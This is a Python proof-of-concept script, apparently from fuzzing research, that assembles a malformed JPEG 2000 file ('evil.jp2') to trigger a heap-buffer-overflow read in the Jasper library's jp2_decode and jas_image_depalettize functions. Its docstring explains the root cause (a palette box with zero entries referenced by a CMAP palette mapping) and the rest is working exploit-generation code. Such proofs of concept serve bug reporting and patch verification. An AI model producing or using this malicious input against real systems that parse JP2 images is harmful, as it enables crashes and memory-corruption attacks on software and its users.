#!/usr/bin/env python3
"""
VULN 001 PoC Generator - Jasper jp2_decode null-ptr / heap-buffer-overflow
File:     src/libjasper/jp2/jp2_dec.c, line 370-372
Function: jp2_decode
CVE:      n/a (PoC for unchecked jas_alloc2 return value)

Trigger mechanism:
  PCLR box with NE=0 (numlutents=0) + CMAP with MTYP=1 (palette)
  causes the following execution path:

  jp2_dec.c:370: lutents = jas_alloc2(0, sizeof(int_fast32_t))
                           // jas_alloc2(0, N) calls malloc(0)
                           // ASAN returns a valid min-size allocation
  jp2_dec.c:371: for (i=0; i<0; ++i) { ... }   // 0 iterations, safe
  jp2_dec.c:375: jas_image_depalettize(..., numlutents=0, lutents=ptr, ...)

  Inside jas_image_depalettize (jas_image.c:988-998):
    v = jas_image_readcmptsample(...)  // v = 128 (pixel value)
    v >= numlutents (0) => v = numlutents - 1 = -1
    lutents[-1]  =>  HEAP-BUFFER-OVERFLOW (8 bytes before allocation)
                     ASAN fires: heap-buffer-overflow on READ

  Root cause: jas_alloc2 return at line 370 is never checked for NULL.
  With numlutents=0 the heap-oob variant is reliably triggered via the
  unclamped index (-1) passed to the lut array.
"""

import struct
import subprocess
import os
import sys
import tempfile

POC_DIR  = "/data/ylwang/non-textfuzz/target/_poc/jasper/src_appl_dummy_c"
JASPER   = "/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/jasper"
OUT_FILE = os.path.join(POC_DIR, "evil.jp2")


# ---------------------------------------------------------------------------
# Helper: JP2 box builder
# ---------------------------------------------------------------------------
def make_box(box_type: bytes, data: bytes) -> bytes:
    """Return a JP2 box: 4-byte BE length (incl. 8-byte header) + type + data."""
    assert len(box_type) == 4
    return struct.pack(">I", 8 + len(data)) + box_type + data


# ---------------------------------------------------------------------------
# Step 1: Generate a minimal valid 1x1 8-bit grayscale JPC codestream
# ---------------------------------------------------------------------------
def create_minimal_jpc() -> bytes:
    """
    Use the jasper encoder to produce a valid 1x1 JPC codestream.
    Input: a raw PGM (P5, 1x1, maxval=255, pixel=0x80).
    """
    pgm_data = b"P5\n1 1\n255\n\x80"
    with tempfile.NamedTemporaryFile(suffix=".pgm", delete=False) as f:
        f.write(pgm_data)
        pgm_path = f.name
    jpc_path = pgm_path.replace(".pgm", ".jpc")
    try:
        result = subprocess.run(
            [JASPER,
             "--input", pgm_path, "--input-format", "pnm",
             "--output-format", "jpc", "--output", jpc_path],
            capture_output=True,
        )
        if result.returncode != 0:
            sys.exit(f"[!] jasper encoder failed: {result.stderr.decode()}")
        with open(jpc_path, "rb") as f:
            return f.read()
    finally:
        os.unlink(pgm_path)
        if os.path.exists(jpc_path):
            os.unlink(jpc_path)


# ---------------------------------------------------------------------------
# Step 2: Assemble the malicious JP2
# ---------------------------------------------------------------------------
def create_evil_jp2(jpc: bytes) -> bytes:
    """
    Build a JP2 file that exercises the vulnerable CMAP palette path
    with numlutents=0, producing a heap-buffer-overflow at lutents[-1].

    Box layout (flat - JP2H is a superbox so IHDR/COLR are exposed):
      JP  (signature)
      ftyp
      jp2h  <- superbox, decoded as:
        ihdr
        colr
      pclr  <- PCLR with NE=0, NPC=1, Bi=[7]
      cmap  <- CMAP: CMP=0, MTYP=1 (palette), PCOL=0
      cdef  <- CDEF: 1 channel, channo=0, type=0, assoc=1
               (required so dec->cdef != NULL at jp2_dec.c:364;
                without CDEF box UBSAN fires before reaching line 370)
      jp2c  <- valid 1x1 JPC codestream
    """

    # --- JP2 Signature ---
    jp_sig = make_box(b"jP  ", b"\x0d\x0a\x87\x0a")

    # --- File Type: brand=jp2, minV=0, CompatibilityList=[jp2] ---
    ftyp = make_box(b"ftyp", b"jp2 \x00\x00\x00\x00jp2 ")

    # --- IHDR: height=1, width=1, ncomp=1, bpc=7, C=7, UnkC=0, IPR=0 ---
    #   bpc=7 => 8-bit unsigned (bpc = bit_depth - 1, no sign bit)
    #   C=7   => JP2_IHDR_COMPTYPE (JPEG-2000 codestream)
    ihdr_data = struct.pack(">IIHBBBB", 1, 1, 1, 7, 7, 0, 0)
    ihdr = make_box(b"ihdr", ihdr_data)

    # --- COLR: enumerated colorspace, grayscale (17) ---
    colr_data = struct.pack(">BBBI", 1, 0, 0, 17)   # METH=1, PREC=0, APPROX=0, EnumCS=17
    colr = make_box(b"colr", colr_data)

    # --- JP2H superbox ---
    jp2h = make_box(b"jp2h", ihdr + colr)

    # --- PCLR: NE=0, NPC=1, Bi[0]=0x07 (8-bit unsigned) ---
    #   NE=0  => numlutents=0  (no actual lut entries, but CMAP still references palette)
    #   NPC=1 => numchans=1
    #   Bi[0]=7 => 8-bit unsigned
    #   No lut data bytes (NE=0)
    pclr_data = struct.pack(">HBB", 0, 1, 0x07)   # NE, NPC, Bi[0]
    pclr = make_box(b"pclr", pclr_data)

    # --- CMAP: 1 entry: CMP=0, MTYP=1 (JP2_CMAP_PALETTE), PCOL=0 ---
    #   MTYP=1 triggers the JP2_CMAP_PALETTE branch at jp2_dec.c:369
    #   PCOL=0 < NPC=1 => passes the sanity check at jp2_dec.c:342-346
    cmap_data = struct.pack(">HBB", 0, 1, 0)       # CMP=0, MTYP=1, PCOL=0
    cmap = make_box(b"cmap", cmap_data)

    # --- CDEF: 1 channel definition ---
    #   Without CDEF, dec->cdef is NULL and UBSAN fires at jp2_dec.c:364
    #   before we reach the intended vulnerability at line 370.
    #   chan 0: channo=0 (channel 0), type=0 (color), assoc=1 (first color association)
    #   numchans field: 1
    cdef_data = struct.pack(">HHHH", 1, 0, 0, 1)   # numchans=1, channo=0, type=0, assoc=1
    cdef = make_box(b"cdef", cdef_data)

    # --- JP2C: valid codestream ---
    jp2c = make_box(b"jp2c", jpc)

    return jp_sig + ftyp + jp2h + pclr + cmap + cdef + jp2c


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    os.makedirs(POC_DIR, exist_ok=True)

    print("[*] Generating minimal 1x1 JPC codestream via jasper encoder...")
    jpc = create_minimal_jpc()
    print(f"    JPC codestream: {len(jpc)} bytes")

    print("[*] Assembling malicious JP2 with PCLR NE=0 + CMAP MTYP=1...")
    evil = create_evil_jp2(jpc)

    with open(OUT_FILE, "wb") as f:
        f.write(evil)

    print(f"[+] Written: {OUT_FILE} ({len(evil)} bytes)")
    print("[+] Trigger: PCLR(NE=0,NPC=1) + CMAP(MTYP=1,PCOL=0)")
    print("[+] Expected: ASAN heap-buffer-overflow at jas_image_depalettize lutents[-1]")


if __name__ == "__main__":
    main()
